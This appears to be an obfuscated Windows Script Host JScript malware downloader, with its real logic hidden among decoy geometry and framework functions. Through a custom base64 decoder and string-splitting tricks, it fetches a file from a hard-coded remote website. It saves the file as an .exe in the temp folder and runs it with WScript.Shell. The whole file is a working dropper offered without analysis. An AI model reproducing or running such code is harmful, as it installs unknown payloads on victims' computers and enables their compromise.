
var winds = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  sunday = [];
	
var celibacy = { ':': '.','U': 'S','381': 'X'};
	var hispanic = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function accompanies(embargo) {
	challenging = embargo;
	for (var i in celibacy){challenging = challenging.replace(i, celibacy[i]);}
    return challenging;
};

var bedlam = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.accompanies4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/christianity/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = winds[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = winds[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = winds[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = winds[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var scheme ="christianityJVchristianityRFTVchristianityAl".accompanies4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var quarrelsome = "christianityQWchristianityN0aXZchristianitylWE9iachristianitymVjdA=christianity=".accompanies4();
String.prototype.accompanies2 = function () {
    var motherhood = {
        kathleen: this
    };
    motherhood.purpose = motherhood.kathleen["c3Vic3RyaW5n".accompanies4()](hispanic, bedlam);
    return motherhood.purpose;
};

var slang ="christianityRXhwYW5christianitykRW52aXchristianityJvbm1lbnRTdHJchristianitypbmdz".accompanies4();
var Native = function(options){
	
};
var particularly = [quarrelsome, slang,scheme,  ""+"."+("wheels","sandwich","nazareth","welcome","usurpation","density","sponsors","macedonia","exe"), "UnVu".accompanies4(), accompanies("M"+"SX"+"ML"+("cameo","medicaid","subsides","established","bargain","miniature","converging","2.")+"381M"+"LH"+"TT"+("mecca","daughters","recorder","steadfastly","fortyfour","chancery","sauce","abasement","P>")+"WU"+("habitable","answer","apparel","determine","airlines","nether","deficit","cr")+("chains","these","compatible","belize","erotica","upskirt","darius","controversial","ip")+"t:"+("palmer","discrimination","tease","happening","mover","throwing","intimidate","latter","Sh")+"ell")];
burns = "_F2_";
var craftsman = this[particularly.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
KJKaAHVwOvj = "zvPJvVYGOc";
ammonia = (("local", "panorama", "country", "oracular", "banners", "bumper", "bundle", "psSAlhS") + "XangaTymL").accompanies2();
apricot = (("stress", "aging", "degrees", "ostrich", "topaz", "gently", "latin", "wills", "agonizing", "sFzlThqYstw") + "eXfeHI").accompanies2();
  
    String.prototype.militant = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var linear = particularly.pop().split(">");

offset = "b3Blbg==".accompanies4();
var actively = new craftsman(linear[1]);
var slowly = new craftsman(linear[0]);
var monsters = actively[particularly.shift()](particularly.shift());
weasel = "E";

var celtic = particularly.shift();
var roost = particularly.shift();
function socket(massive, favourites) {

    try {
        var secretariat = monsters + "/" + favourites ;
		secretariat = secretariat+ celtic;
            slowly[offset](("lizard","commissioners","retailers","pension","lariat","vernal","lakes","hourly","G" + weasel) + ("accede","entree","brand","chess","gruff","cherub","electoral","guess","sarah","gutter","T"), massive, false);
       
    slowly[apricot + ("athena","acceptable","end")]();
	var prosperously=("ammonia" + WScript=="ammonia" + "V2luZG93cyBTY3JpcHQgSG9zdA==".accompanies4())&&slowly["c3RhdHVz".accompanies4()] +""=="MjAw".accompanies4()&&typeof(hYvNDlxj)==="undefined";

    if (prosperously) {
		
        var encouraged = new craftsman((("enormous","brake","precept","hydrochloric","cornish","bemoan","lilac","floors","A")+("souvenir","manufacture","contact","amenities","roads","giver","advocate","thwart","SEOO")+"DB"+("prehistoric","eruption","warmhearted","provide","ministries","cuckoo","humiliate",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        encouraged[offset]();
        tvVkijmbo = "_F9_";
        encouraged.type = bedlam;
        glBARMvvSch = "_F10_";
        encouraged["d3JpdGU=".accompanies4()](slowly[("custard","climber","gained","vendors","admonish","rhetorical","references","")+"R"+"es"+"pon"+celibacy['U'].toLowerCase()+"e"+"Qm9keQ==".accompanies4()]);
        rlheLq = "_F11_";
        encouraged[(ammonia + "o"+("chief","nitrogenous","cannibal","razor","gaseous","conglomerate","briar","unmanned","00")+("utilities","gently","gauze","projector","amidships","unblemished","suzerain","8i")+"tion").replace("0"+("muffler","bedroom","somebody","klein","epinions","bucks","driver","08"), apricot)] = 0;
        VYwWPFWxlXT = "_F12_";
        encouraged.saveToFile(secretariat, 2);
        eOPBfFxCah = "_F13_";
        encouraged.close();
        DhsrdJdexU = "_F14_";
		actively[roost](secretariat, bedlam, true);
    }
} catch (sRJnKUU) { };

    kxYqdmB = "_F15_";
}
try{
socket("aHRchristianity0cDchristianityovLw=christianity=".accompanies4()+"\u0077\u0077\u0077"+"\u002E\u0070\u0075\u0065\u0072\u0074\u0061\u0073\u006A\u006F\u0061\u0071\u0075\u0069\u006E\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?cynNQNjRPw=TMiSwPU","WRQTCHKW");}catch(EPpeAbbE){}

   hrDIQxo = "_F16_";
   